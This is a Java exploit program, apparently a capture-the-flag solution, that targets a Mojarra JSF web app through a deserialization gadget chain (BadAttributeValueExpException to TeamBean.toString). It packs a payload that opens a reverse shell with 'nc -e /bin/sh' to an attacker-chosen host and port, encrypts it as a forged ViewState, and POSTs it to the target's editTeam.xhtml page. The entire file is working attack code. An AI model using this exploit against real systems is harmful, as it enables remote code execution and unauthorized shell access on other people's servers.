import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.zip.GZIPOutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import ascis.TeamBean;

// Encrypt: Serialize -> GZIP -> Enc -> Base64 [ViewState]
// Decrypt: [ViewState] Base64 -> Dec -> GZIP -> Serialize
public class ascisz {
    private static String encodeValue(String value) {
        try {
            return URLEncoder.encode(value, StandardCharsets.UTF_8.toString());
        } catch (UnsupportedEncodingException ex) {
            throw new RuntimeException(ex.getCause());
        }
    }
    public static void main(String[] args) throws Exception {
        if (args.length != 4 ) {
            System.out.println("Usage: java -jar mojarra_sol.jar <rhost> <rport> <lhost> <lport>");
            System.exit(0);
        }
        String rhost = args[0];
        String rport = args[1];
        String lhost = args[2];
        String lport = args[3];
        TeamBean team = new TeamBean();
        String payload = "var message = \"tsudepzai\";"+
                String.format("var lhost = \"%s\";",lhost) +
                String.format("var lport = \"%s\";",lport) +
                "p = new java.lang.ProcessBuilder();"+
                "p.command(\"nc\",\"-e\",\"/bin/sh\", lhost, lport);"+
                "p.start();";
        // Set team_secret_status true
        Field team_secret_status = team.getClass().getDeclaredField("team_secret_status");
        team_secret_status.setAccessible(true);
        team_secret_status.set(team, true);

        // Set payload eval
        Field template = team.getClass().getDeclaredField("template");
        template.setAccessible(true);
        template.set(team, payload);

        // gadget BadAttributeValueExpException.readObject() -> TeamBean.toString()
        BadAttributeValueExpException bad = new BadAttributeValueExpException(null);
        Field val = bad.getClass().getDeclaredField("val");
        val.setAccessible(true);
        val.set(bad, team);

        // Encrypt: Serialize Obj -> GZIP -> Enc -> Base64 [ViewState]
        ByteArrayGuard guard = new ByteArrayGuard();
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream outputStream = new ObjectOutputStream(byteArrayOutputStream);
        outputStream.writeObject(bad);
        outputStream.close();

        ByteArrayOutputStream byteArrayOutputStreamGzip = new ByteArrayOutputStream();

        GZIPOutputStream gzipOutputStream = new GZIPOutputStream(byteArrayOutputStreamGzip);
        gzipOutputStream.write(byteArrayOutputStream.toByteArray());
        gzipOutputStream.close();

        byte[] bytes = byteArrayOutputStreamGzip.toByteArray();
        bytes = guard.encrypt(bytes);

        //System.out.println(Base64.getEncoder().encodeToString(bytes));

        // Exploit
        String url = String.format("http://%s:%s/mojarra_war/editTeam.xhtml", rhost, rport);
        HttpURLConnection httpClient = (HttpURLConnection) new URL(url).openConnection();
        httpClient.setRequestMethod("POST");

        String urlParameters = "javax.faces.ViewState="+encodeValue(Base64.getEncoder().encodeToString(bytes));

        httpClient.setDoOutput(true);
        try (DataOutputStream wr = new DataOutputStream(httpClient.getOutputStream())) {
            wr.writeBytes(urlParameters);
            wr.flush();
            httpClient.getResponseCode();
        }
    }
}

